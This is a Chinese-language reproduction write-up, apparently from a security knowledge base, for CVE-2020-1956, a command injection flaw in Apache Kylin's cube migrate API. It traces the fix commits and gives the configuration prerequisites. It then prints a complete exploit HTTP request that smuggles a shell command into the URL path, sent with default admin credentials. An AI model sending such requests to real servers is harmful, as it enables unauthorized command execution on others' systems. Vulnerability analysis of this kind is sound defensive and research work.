<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-1956）Apache Kylin 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>Kylin 2.3.0 - 2.3.2<br />Kylin 2.4.0 - 2.4.1<br />Kylin 2.5.0 - 2.5.2<br />Kylin 2.6.0 - 2.6.5<br />Kylin 3.0.0-alpha, Kylin 3.0.0-alpha2, Kylin 3.0.0-beta, Kylin 3.0.0, Kylin<br />3.0.1</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>在两条commit记录</p><p><a href="https://github.com/apache/kylin/commit/9cc3793ab2f2f0053c467a9b3f38cb7791cd436a">KYLIN-4426 Refine CliCommandExecutor</a></p><p><a href="https://github.com/apache/kylin/commit/335d61b62517006d7e7b55638bb6fd305dffbea1?diff=split">KYLIN-4426 CliCommandExecutor</a></p><p>可以看到动刀子的位置，应该就是漏洞点的命令执行了，<strong>CubeService</strong> 应该就是命令执行的地方了，然后在 <strong>CliCommandExecutor.checkParameterWhiteList</strong> 做了一些处理。<br />1.png</p><p>2.png</p><p>所以根据<a href="https://github.com/apache/kylin/blob/master/server-base/src/main/java/org/apache/kylin/rest/controller/CubeController.java">CubeController</a>，就能找到对应路由了<br />3.jpeg</p><p>当然在命令执行的地方触发之前，有几个值判断，因此需要加上这几个东西。<br />4.png</p><p>Copy to clipboardkylin.tool.auto-migrate-cube.enabled=true<br />kylin.tool.auto-migrate-cube.src-config=/home/admin/apache-kylin-3.0.1-bin-hbase1x<br />kylin.tool.auto-migrate-cube.dest-config=/tmp/kylin.properties</p><h3>漏洞复现</h3><p>POST /kylin/api/cubes/kylin_sales_cube/aaa&amp;touch%20l1nk31&amp;/migrate HTTP/1.1<br />Host: www.0-sec.org:7070<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0<br />Accept: application/json, text/plain, */*<br />Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br />Accept-Encoding: gzip, deflate<br />Cache-Control: no-cache<br />Pragma: no-cache<br />Authorization: Basic QURNSU46S1lMSU4=<br />Connection: close<br />Referer: http://127.0.0.1:7070/kylin/admin<br />Cookie: project=null; JSESSIONID=2B1DC2A8566558EFF0E6BD91E5BD630E; _ga=GA1.1.636880978.1585905453; rdt_uuid=22a7eaa3-24d1-441a-b4fd-2f87dfe0197f; _fbp=fb.3.1585905456831.913087212<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 11<br /><br />project=aaa</p><p>5.png</p></body></html>